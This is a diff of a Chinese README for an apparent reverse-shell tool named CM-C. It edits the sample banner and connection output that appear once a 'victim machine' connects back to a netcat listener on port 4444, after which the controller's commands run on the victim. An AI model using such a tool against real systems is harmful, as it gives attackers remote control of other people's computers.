@@ -59,16 +59,18 @@ nc -lp 4444
 ````
 4. 受害机上线后，控制端会显示信息如：
 ```
-   _____    __  __                _____  
-  / ____|  |  \/  |             / ____| 
- | |       | \  / |   ______   | |      
- | |       | |\/| |  |______|  | |      
- | |____   | |  | |            | |____   
+
+   _____    __  __               _____
+  / ____|  |  \/  |             / ____|
+ | |       | \  / |   ______   | |
+ | |       | |\/| |  |______|  | |
+ | |____   | |  | |            | |____
   \_____|  |_|  |_|             \_____|
-Version: 1.0.0, Build: May 10 2026 18:35:21
-ProjectURL: https://github.com/xiaozhang-qd/CM-C, IssueURL: https://github.com/xiaozhang-qd/CM-C/issues/1
+
+Version: 1.0.0, Build: 2026-05-11 23:44:05
+[*] Disconnection count: 0
 [+] Connected successfully.
--{2026-05-10 18:35:29}-{(mapp.exe)[C:\Users\usus\项目\CM-C]}->
+ {2026-05-10 18:35:29}-{(mapp.exe)[C:\Users\usus\项目\CM-C]}->
 ```
 5. 控制端可以输入命令，受害机会执行并返回结果。
 6. 控制端可以输入exit退出连接。
